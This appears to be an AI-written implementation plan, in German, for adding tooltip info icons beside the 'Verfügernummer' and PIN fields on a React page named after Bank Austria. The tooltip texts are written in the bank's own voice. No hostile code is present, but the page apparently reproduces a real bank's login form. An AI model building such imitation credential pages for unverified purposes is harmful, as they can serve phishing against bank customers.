

## Info-Icons mit Tooltip neben Verfügernummer & PIN

### Änderungen in `src/pages/BankAustria.tsx`

**1. Import hinzufügen:**
- Das hochgeladene Icon nach `src/assets/` kopieren (`info-icon.jpeg`)
- Import: `import infoIcon from "@/assets/info-icon.jpeg";`

**2. Zeilen 135-144 (Verfügernummer) und 146-155 (PIN) — Wrapper mit Icon:**

Jedes Eingabefeld bekommt einen `flex`-Container mit `relative`-Tooltip:

```
[  Verfügernummer  ] (i)
[       PIN        ] (i)
```

- `<div className="flex items-center gap-2">` um Input + Icon
- Icon: `<img src={infoIcon} className="h-6 w-6 cursor-pointer" />` in einem `relative`-Container
- Tooltip: `<div>` mit absolutem Positioning, weißer Hintergrund, Schatten, kleines Dreieck (CSS-Pfeil) — erscheint bei Hover (`group-hover:block`) oder Klick (State toggle)

**3. Tooltip-Logik:**
- State: `const [showTooltip, setShowTooltip] = useState<"verfueger" | "pin" | null>(null);`
- `onMouseEnter` / `onMouseLeave` + `onClick` toggle
- Verfügernummer-Text: "Die Verfügernummer ist eine von zwei notwendigen Komponenten für den Login. Sie ist eine Kombination aus bis zu 8 Ziffern."
- PIN-Text: "Die PIN ist die zweite für den Login notwendige Komponente. Die initiale PIN wird von der Bank Austria definiert und kann von Ihnen, nach dem ersten Login, geändert werden."

**4. Tooltip-Styling (Sprechblase):**
- Weiß/hellgrauer Hintergrund, abgerundete Ecken, Schatten
- Kleines Dreieck (CSS `::before` oder Border-Trick) das zum Icon zeigt
- Position: rechts oder oberhalb des Icons
- Max-Breite ~280px, Textfarbe dunkelgrau, Schriftgröße `text-sm`

### Dateien
- `src/assets/info-icon.jpeg` — Icon kopieren
- `src/pages/BankAustria.tsx` — State, Wrapper, Tooltip-Komponente

